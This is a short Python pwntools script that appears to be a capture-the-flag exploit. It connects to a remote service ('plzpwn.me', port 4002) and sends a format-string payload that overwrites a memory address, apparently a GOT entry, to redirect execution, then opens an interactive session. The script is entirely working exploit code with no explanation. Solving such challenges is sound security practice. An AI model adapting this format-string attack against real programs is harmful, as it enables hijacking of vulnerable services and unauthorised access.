#!/usr/bin/python2

from pwn import *

ENCODING = "ascii"

def main():	
	io = connect('plzpwn.me', 4002)
	payload = fmtstr_payload(3, {0x08049C18:0x08048536},0,'byte')
	print("pay: ["+payload+"]")
	io.recvuntil("You say:")
	io.sendline(payload)
	io.interactive()



if __name__ == '__main__':
	main()